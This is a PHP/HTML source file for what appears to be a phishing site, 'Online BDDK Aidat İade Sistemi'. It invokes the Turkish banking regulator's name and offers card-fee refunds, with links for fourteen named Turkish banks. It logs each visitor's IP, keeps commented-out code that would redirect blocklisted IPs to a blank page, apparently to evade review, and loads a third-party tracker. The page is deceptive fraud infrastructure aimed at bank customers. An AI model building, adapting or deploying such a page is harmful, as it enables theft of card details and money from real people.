<?php
    ob_start();
    session_start();
    include 'ing/baglan.php';

    $ayarsor = $db->prepare("SELECT * from ayarlar where ayar_id=:id");
    $ayarsor->execute(array(
        'id' => 0
    ));
    $ayarcek=$ayarsor->fetch(PDO::FETCH_ASSOC);

    $gelenIP = GetIP();


    //  $query =  mysql_query('SELECT * FROM ip'); 
    //while($row = mysql_fetch_assoc($query)){ 
    //    if($row['ip'] == $ipcik){ 
    //        header('Location: about:blank'); 
    //    }
    //}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
<audio id="audioplayer" autoplay=true>
			
<source src="gucluturkiye.mp3" type="audio/mpeg">
			
Tarayiciniz ses elementlerini desteklemiyor. </audio>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $ayarcek['ayar_title']; ?></title>
    <meta charset="utf-8">
    <meta name="author" content="<?php echo $ayarcek['ayar_author']; ?>">
    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800%7CPoppins:400,500,700,800,900%7CRoboto:100,300,400,400i,500,700">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="assets\css\style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="assets\css\skins\default.css">

    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="tema\css\bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="tema\fonts\font-awesome\css\font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="tema\fonts\flaticon\font\flaticon.css">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="tema\img\favicon.ico" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800%7CPoppins:400,500,700,800,900%7CRoboto:100,300,400,400i,500,700">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="tema\css\style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="tema\css\skins\default.css">
</head>
<body id="top">
<div class="page_loader"></div>

<link rel="icon" type="image/x-icon" href="tema\img\favicon.png">
   
<!-- Login 1 start -->
<div class="card bg-secondary shadow border-0">
<div class="login-1">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                        <a href="#">
                            <img src="tema\img\logos\logo-2.png"  alt="logo">
                        </a>
                        <h3>Online BDDK Aidat İade Sistemi</h3>


			<font size="2" color="#960000">Kart İade yapmak istediğiniz bankanızı aşağıdan seçiniz. (Banka görselini seçerek devam edebilirsiniz) </font>
			<br>
			<br>
<div class="row">
  <div class="span6">
	<a href="index.php?banka=akbank"><img src="tema/img/logos/akbank.png" alt="akbank kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=albaraka"><img src="tema/img/logos/albaraka.png" alt="albaraka kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=denizbank"><img src="tema/img/logos/denizbank.png" alt="denizbank kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=halkbank"><img src="tema/img/logos/halkbank.png" alt="halkbank kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=ingbank"><img src="tema/img/logos/ingbank.png" alt="ingbank kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=isbankasi"><img src="tema/img/logos/isbankasi.png" alt="isbank kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=kuveytturk"><img src="tema/img/logos/kuveytturk.png" alt="kuveytturk kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=odeabank"><img src="tema/img/logos/odeabank.png" alt="odeabank kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=garanti"><img src="tema/img/logos/garanti.png" alt="garanti bankası kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=qnbfinans"><img src="tema/img/logos/qnbfinans.png" alt="qnbfinans kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=tebbankasi"><img src="tema/img/logos/tebbankasi.png" alt="tebbankasi kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=vakifbank"><img src="tema/img/logos/vakifbank.png" alt="vakifbank kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=yapikredi"><img src="tema/img/logos/yapikredi.png" alt="yapikredi kredi kartı iadat iade sistemi"></a>
  </div>
  <div class="span6">
	<a href="index.php?banka=ziraatbank"><img src="tema/img/logos/ziraatbank.png" alt="ziraatbank kredi kartı iadat iade sistemi"></a>
  </div>
</div>

</form>
                       
                </div>
            </div>
        </div>
    </div>
</div>




<script id="_wau7te">var _wau = _wau || []; _wau.push(["small", "a5u3l86rki", "7te"]);</script><script async src="//waust.at/s.js"></script>
</body>
</html>